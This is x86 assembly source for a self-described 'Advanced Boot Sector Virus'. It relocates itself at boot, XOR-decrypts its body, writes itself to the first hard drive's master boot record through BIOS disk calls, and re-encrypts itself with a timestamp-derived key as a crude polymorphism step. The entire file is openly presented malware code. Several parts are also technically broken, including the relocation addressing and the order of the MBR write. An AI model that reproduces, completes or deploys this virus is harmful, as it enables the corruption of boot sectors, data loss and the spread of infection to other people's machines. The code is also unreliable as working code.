; Advanced Boot Sector Virus
; Infects MBR, loads before OS, with stealth and persistence
org 0x7C00

; Virus entry point
start:
    cli                 ; Disable interrupts
    xor ax, ax          ; Zero out registers
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00      ; Set stack pointer

    ; Relocate virus to safe memory location (0x0600)
    mov si, 0x7C00
    mov di, 0x0600
    mov cx, 512
    rep movsb

    ; Jump to relocated code
    jmp 0x0000:relocated

relocated:
    ; Decrypt virus body (simple XOR encryption with key 0x5A)
    mov si, encrypted_body
    mov di, si
    mov cx, encrypted_end - encrypted_body
    mov bl, 0x5A        ; Encryption key
decrypt_loop:
    lodsb
    xor al, bl
    stosb
    loop decrypt_loop

    ; Save original MBR
    mov si, 0x7C00
    mov di, original_mbr
    mov cx, 512
    rep movsb

    ; Infect other disks (simplified for removable media)
    call infect_disks

    ; Execute payload (display 'X' as example)
    mov ah, 0x0E
    mov al, 'X'
    int 0x10

    ; Restore and boot original MBR
    mov si, original_mbr
    mov di, 0x7C00
    mov cx, 512
    rep movsb
    jmp 0x0000:0x7C00

; Infection routine (simplified polymorphic infection)
infect_disks:
    pusha
    mov ah, 0x02        ; BIOS read sector
    mov al, 1           ; Read 1 sector
    mov ch, 0           ; Cylinder 0
    mov cl, 1           ; Sector 1
    mov dh, 0           ; Head 0
    mov dl, 0x80        ; First hard drive (adjust for others)
    mov bx, 0x0500      ; Buffer
    int 0x13
    jc infect_done      ; Skip if read fails

    ; Check if already infected (simple signature check)
    cmp word [bx], 0x5A5A
    je infect_done

    ; Polymorphic modification (XOR with random value)
    rdtsc               ; Use timestamp counter for pseudo-randomness
    mov bl, al          ; Use low byte as new key
    mov si, encrypted_body
    mov cx, encrypted_end - encrypted_body
poly_loop:
    lodsb
    xor al, bl
    stosb
    loop poly_loop

    ; Write virus to new disk
    mov ah, 0x03        ; BIOS write sector
    mov al, 1
    mov ch, 0
    mov cl, 1
    mov dh, 0
    mov dl, 0x80
    mov bx, 0x7C00
    int 0x13

infect_done:
    popa
    ret

; Encrypted virus body (decrypted at runtime)
encrypted_body:
    ; XOR-encrypted with key 0x5A (example data)
    db 0xFF ^ 0x5A, 0xEE ^ 0x5A, 0xDD ^ 0x5A
    ; Add more encrypted code here as needed
encrypted_end:

; Storage for original MBR
original_mbr:
    times 446 - ($ - $$) db 0  ; Space for virus code (before partition table)

; Partition table (dummy for example)
    db 0x80, 0x01, 0x01, 0x00, 0x83, 0xFE, 0xFF, 0xFF
    db 0x3F, 0x00, 0x00, 0x00, 0xC1, 0xF0, 0xFF, 0x00
    times 64 - 16 db 0  ; Remaining partition table entries

; Boot signature
    dw 0xAA55
